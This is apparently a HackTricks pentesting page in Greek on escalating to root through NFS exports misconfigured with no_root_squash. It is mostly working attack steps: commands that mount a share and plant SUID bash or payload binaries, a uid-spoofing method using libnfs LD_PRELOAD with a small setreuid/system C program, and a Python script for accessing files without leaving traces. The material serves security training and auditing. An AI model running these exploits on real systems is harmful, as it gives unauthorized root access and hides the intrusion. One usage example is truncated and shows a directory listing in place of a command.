# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες για το Squashing

Το NFS συνήθως (ειδικά στο linux) εμπιστεύεται τα υποδεικνυόμενα `uid` και `gid` από τον client που συνδέεται για την πρόσβαση στα αρχεία (αν δεν χρησιμοποιείται kerberos). Ωστόσο, υπάρχουν ορισμένες ρυθμίσεις που μπορούν να οριστούν στον server ώστε να **αλλάξει αυτή η συμπεριφορά**:

- **`all_squash`**: Κάνει squash σε όλες τις προσβάσεις, αντιστοιχίζοντας κάθε user και group στο **`nobody`** (65534 unsigned / -2 signed). Επομένως, όλοι είναι `nobody` και δεν χρησιμοποιούνται users.
- **`root_squash`/`no_all_squash`**: Αυτή είναι η προεπιλογή στο Linux και κάνει squash **μόνο στις προσβάσεις με uid 0 (root)**. Επομένως, οποιαδήποτε `UID` και `GID` είναι trusted, αλλά το `0` γίνεται squash σε `nobody` (άρα δεν είναι δυνατή η root impersonation).
- **``no_root_squash`**: Αν αυτή η ρύθμιση είναι ενεργοποιημένη, δεν κάνει squash ούτε στον root user. Αυτό σημαίνει ότι αν κάνετε mount έναν directory με αυτή τη ρύθμιση, μπορείτε να αποκτήσετε πρόσβαση σε αυτόν ως root.

Στο αρχείο **/etc/exports**, αν βρείτε κάποιο directory που έχει ρυθμιστεί ως **no_root_squash**, τότε μπορείτε να έχετε **πρόσβαση** σε αυτόν **ως client** και να κάνετε **write μέσα** σε αυτόν **σαν** να ήσασταν ο τοπικός **root** του machine.

Για περισσότερες πληροφορίες σχετικά με το **NFS**, δείτε:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Option 1 using bash:
- **Κάνοντας mount αυτόν τον directory** σε ένα client machine και, **ως root, αντιγράφοντας** μέσα στον mounted φάκελο το binary **/bin/bash** και δίνοντάς του δικαιώματα **SUID**, και **εκτελώντας από το victim** machine αυτό το bash binary.
- Σημειώστε ότι για να είστε root μέσα στο NFS share, πρέπει να έχει ρυθμιστεί το **`no_root_squash`** στον server.
- Ωστόσο, αν δεν είναι ενεργοποιημένο, θα μπορούσατε να κάνετε escalate σε άλλον user αντιγράφοντας το binary στο NFS share και δίνοντάς του το SUID permission ως ο user στον οποίο θέλετε να κάνετε escalate.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 με χρήση compiled κώδικα C:
- **Mounting αυτού του directory** σε ένα client machine και **ως root αντιγράφοντας** μέσα στον mounted folder το compiled payload μας, το οποίο θα κάνει abuse του SUID permission, θα του δώσει **SUID** rights και θα **εκτελεστεί από το victim** machine αυτό το binary (μπορείτε να βρείτε εδώ μερικά [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Οι ίδιοι περιορισμοί όπως και πριν
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Σημειώστε ότι, αν μπορείτε να δημιουργήσετε ένα **tunnel από το μηχάνημά σας προς το μηχάνημα του θύματος, μπορείτε και πάλι να χρησιμοποιήσετε την Remote version για να εκμεταλλευτείτε αυτό το privilege escalation, προωθώντας τις απαιτούμενες ports**.\
> Το ακόλουθο trick αφορά την περίπτωση όπου το αρχείο `/etc/exports` **υποδεικνύει μια IP**. Σε αυτή την περίπτωση **δεν θα μπορείτε να χρησιμοποιήσετε** σε καμία περίπτωση το **remote exploit** και θα χρειαστεί να **εκμεταλλευτείτε αυτό το trick**.\
> Μια ακόμη απαραίτητη προϋπόθεση για να λειτουργήσει το exploit είναι το **export μέσα στο `/etc/export`** να **χρησιμοποιεί το `insecure` flag**.\
> --_Δεν είμαι βέβαιος ότι αυτό το trick θα λειτουργήσει αν το `/etc/export` υποδεικνύει μια διεύθυνση IP_--

### Βασικές Πληροφορίες

Το σενάριο περιλαμβάνει την εκμετάλλευση ενός mounted NFS share σε ένα local μηχάνημα, αξιοποιώντας ένα flaw στην προδιαγραφή NFSv3, το οποίο επιτρέπει στον client να καθορίζει το uid/gid του και ενδέχεται να επιτρέψει μη εξουσιοδοτημένη πρόσβαση. Η exploitation περιλαμβάνει τη χρήση του [libnfs](https://github.com/sahlberg/libnfs), μιας library που επιτρέπει τη δημιουργία πλαστών NFS RPC calls.<sup>[[1]](#references)</sup>

#### Compilation της Library

Τα βήματα compilation της library ενδέχεται να απαιτούν προσαρμογές ανάλογα με την έκδοση του kernel. Σε αυτή τη συγκεκριμένη περίπτωση, τα fallocate syscalls έγιναν comment out. Η διαδικασία compilation περιλαμβάνει τις ακόλουθες εντολές:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Εκτέλεση του Exploit

Το exploit περιλαμβάνει τη δημιουργία ενός απλού προγράμματος C (`pwn.c`) που αυξάνει τα privileges σε root και στη συνέχεια εκτελεί ένα shell. Το πρόγραμμα γίνεται compile και το resulting binary (`a.out`) τοποθετείται στο share με suid root, χρησιμοποιώντας το `ld_nfs.so` για την πλαστογράφηση του uid στις RPC calls:

1. **Compile του κώδικα του exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Τοποθετήστε το exploit στο share και τροποποιήστε τα permissions του πλαστογραφώντας το uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Εκτελέστε το exploit για να αποκτήσετε δικαιώματα root:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell για Stealthy File Access

Μόλις αποκτηθεί πρόσβαση root, για αλληλεπίδραση με το NFS share χωρίς αλλαγή ownership (ώστε να αποφεύγεται η δημιουργία ιχνών), χρησιμοποιείται ένα Python script (`nfsh.py`). Αυτό το script προσαρμόζει το uid ώστε να αντιστοιχεί σε εκείνο του αρχείου στο οποίο γίνεται πρόσβαση, επιτρέποντας την αλληλεπίδραση με αρχεία στο share χωρίς προβλήματα δικαιωμάτων:<sup>[[1]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Εκτελέστε ως εξής:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Αναφορές

- [1] [A tale of a lesser known NFS privesc](https://www.errno.fr/nfs_privesc.html)

{{#include ../../banners/hacktricks-training.md}}
